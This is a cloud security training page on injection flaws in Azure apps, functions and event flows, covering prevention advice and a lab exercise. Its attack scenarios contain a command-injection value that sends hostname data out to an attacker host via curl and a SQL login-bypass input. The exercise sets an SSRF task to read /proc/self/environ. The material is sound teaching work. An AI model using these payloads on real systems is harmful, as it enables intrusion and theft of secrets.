# CNAS-2: Injection Flaws (App Layer, Cloud Events, Cloud Services)  

## Overview

Injection flaws occur when untrusted input is improperly handled by an application or cloud-native component, allowing attackers to manipulate commands, queries, or system calls. These flaws can result in unauthorized access, data leakage, remote code execution, or compromise of cloud services.

In cloud-native environments, injection flaws may affect traditional web applications as well as serverless functions, event-driven architectures, and cloud service APIs.

## Description

Injection vulnerabilities are among the most critical and common security issues in application and cloud-native development. These occur when user-controlled input is inserted directly into a query, command, or interpreter without proper validation, encoding, or sanitization.

In the context of cloud-native applications, injection flaws can be found in:

- Applications hosted on Azure App Service or Containers that construct dynamic SQL, NoSQL, or OS commands.
- Azure Functions that process untrusted event payloads (e.g., from Event Grid, Service Bus).
- Cloud services that use metadata injection or insecure deserialization.
- Misconfigured serverless logic that allows attackers to influence execution flow via event content.

These issues may allow attackers to:

- Execute arbitrary OS commands (Command Injection)
- Bypass authentication via manipulated queries (SQL/NoSQL Injection)
- Exfiltrate sensitive data via SSRF or metadata service access
- Trigger unintended behavior in cloud automation (Event Injection)

## How To Prevent

* Validate and sanitize all input data before processing.
* Use parameterized queries for database access (e.g., SQL, Cosmos DB).
* Avoid executing system commands with user-controlled input; use strict allowlists or secure SDKs.
* Restrict function/event bindings to expected and safe data formats.
* Implement WAF (Web Application Firewall) and runtime protections to detect injection attempts.
* Apply least privilege to the execution context of cloud functions and containers.

## Example Attack Scenarios

### Scenario #1

An attacker sends a specially crafted HTTP request to an Azure Function with a `cmd` parameter. The function directly passes this parameter to `subprocess.getoutput()` without validation. The attacker injects `cmd=whoami; curl http://attacker.com?data=$(hostname)` to exfiltrate metadata.

### Scenario #2

An API hosted on Azure App Service uses dynamic SQL like:
```sql
SELECT * FROM users WHERE username = '$username'
```
An attacker inputs admin' --, bypassing authentication and logging in without knowing the password.

## Exercise 
### Objective

Perform SSRF attack and fetch the environment variables from /proc/self/environ file.  

**Go to :** https://appazgoat508580-function-app.azurewebsites.net/#/home

[> Solution](https://github.com/ine-labs/AzureGoat/blob/master/attack-manuals/module-1/02-Server%20Side%20Request%20Forgery%20Part%201.md)


